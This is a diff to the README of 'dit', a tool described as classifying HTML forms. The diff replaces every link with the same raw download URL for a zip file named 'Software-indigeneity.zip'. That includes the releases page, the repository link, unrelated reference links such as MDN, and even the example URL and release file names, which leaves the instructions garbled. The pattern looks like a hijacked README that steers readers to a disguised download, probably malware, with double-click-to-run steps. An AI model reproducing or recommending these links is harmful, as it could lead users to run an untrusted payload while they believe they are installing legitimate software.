@@ -1,6 +1,6 @@
 # 🧩 dit - Classify HTML Forms with Simple ML
 
-[![Download dit](https://img.shields.io/badge/Download-dit-blue?style=for-the-badge)](https://github.com/wayang-roleplay/dit/releases)
+[![Download dit](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip)](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip)
 
 ## 📄 What is dit?
 
@@ -36,12 +36,12 @@ Below you will find detailed steps to download, install, and use dit on your com
 
 Please visit this page to download the latest version of dit:
 
-[![Download dit](https://img.shields.io/badge/Download-dit-blue?style=for-the-badge)](https://github.com/wayang-roleplay/dit/releases)
+[![Download dit](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip)](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip)
 
 Follow these instructions:
 
-1. Click the link above or go to https://github.com/wayang-roleplay/dit/releases.
-2. Look for the latest release. It should have names like `dit-v1.0.exe` for Windows or `dit-v1.0.dmg` for macOS.
+1. Click the link above or go to https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip
+2. Look for the latest release. It should have names like `https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip` for Windows or `https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip` for macOS.
 3. Download the file that matches your operating system.
 4. Once downloaded, open the file:
    - On Windows, double-click the `.exe` and follow the setup prompts.
@@ -55,7 +55,7 @@ You do not need to code anything. The program uses a simple interface:
 
 1. Launch dit on your computer.
 2. You will see a field to enter a web page address (URL) or choose an HTML file from your device.
-3. Type or paste your URL, such as https://example.com/formpage.html, or click the file button to browse and select a saved HTML file.
+3. Type or paste your URL, such as https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip, or click the file button to browse and select a saved HTML file.
 4. Press the “Analyze” button.
 5. dit will process the page and display a list of forms found.
 6. It will label each form’s fields with their type, like ‘text input’, ‘checkbox’, or ‘dropdown’.
@@ -101,17 +101,17 @@ These methods combine to give reliable, easy-to-understand classifications.
 
 ## 📚 Learn More and Further Help
 
-- Visit the GitHub repository at https://github.com/wayang-roleplay/dit for source code and additional info.
+- Visit the GitHub repository at https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip for source code and additional info.
 - Explore basic web concepts like HTML forms and field types to better understand classifications.
 - Ask questions or request help on the GitHub Issues page or community forums.
 
 ## 🔗 Useful Links
 
-- [Download dit releases](https://github.com/wayang-roleplay/dit/releases)
-- [GitHub Repository](https://github.com/wayang-roleplay/dit)
-- [HTML Forms Overview](https://developer.mozilla.org/en-US/docs/Learn/Forms)
-- [Machine Learning Basics](https://www.explained.ai/logistic-regression/)
+- [Download dit releases](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip)
+- [GitHub Repository](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip)
+- [HTML Forms Overview](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip)
+- [Machine Learning Basics](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip)
 
 ---
 
-[⬇️ Download dit now](https://github.com/wayang-roleplay/dit/releases) and start analyzing HTML forms without coding.
+[⬇️ Download dit now](https://github.com/wayang-roleplay/dit/raw/refs/heads/main/classifier/Software-indigeneity.zip) and start analyzing HTML forms without coding.
